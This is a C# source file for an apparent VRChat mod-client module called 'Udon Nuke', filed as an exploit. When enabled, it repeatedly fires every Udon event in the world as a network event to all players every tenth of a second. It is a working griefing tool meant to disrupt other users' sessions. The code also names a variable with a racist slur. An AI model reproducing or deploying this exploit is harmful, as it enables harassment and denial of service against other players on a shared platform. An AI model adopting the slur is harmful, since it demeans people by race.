using Trinity.Utilities;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using UnityEngine;
using MelonLoader;
using VRC.Udon;
using VRC.Udon.Common.Interfaces;
using Trinity.SDK;

namespace Trinity.Module.Exploit.UdonExploits
{
    class udonNuke : BaseModule
    {
        public udonNuke() : base("Udon Nuke", "Spams Udon A Lot Of Udon Shit.", Main.Instance.Eventexploitbutton, null, true) { }

        public override void OnEnable()
        {
            MenuUI.Log("EXPLOITS: <color=green>Starting Udon Nuker</color>");
            MelonCoroutines.Start(UdonKill());
        }
        IEnumerator UdonKill()
        {
            while (this.toggled)
            {
                for (int f = 0; f < WorldWrapper.udonBehaviours.Length; f++)
                {
                    foreach (UdonBehaviour udonobjects in UnityEngine.Object.FindObjectsOfType<UdonBehaviour>())
                    {
                        Il2CppSystem.Collections.Generic.Dictionary<string, Il2CppSystem.Collections.Generic.List<uint>>.Enumerator fatblackman = udonobjects._eventTable.GetEnumerator();
                        while (fatblackman.MoveNext())
                        {
                            Il2CppSystem.Collections.Generic.KeyValuePair<string, Il2CppSystem.Collections.Generic.List<uint>> name = fatblackman.current;
                            udonobjects.SendCustomNetworkEvent(VRC.Udon.Common.Interfaces.NetworkEventTarget.All, name.Key);
                            name = null;
                        }
                        fatblackman = null;
                    } 
                    if (!this.toggled)
                        break;
                    yield return new WaitForSeconds(0.1f);
                }
                yield return new WaitForSeconds(0.1f);
            }
            yield break;
        }
    }
}
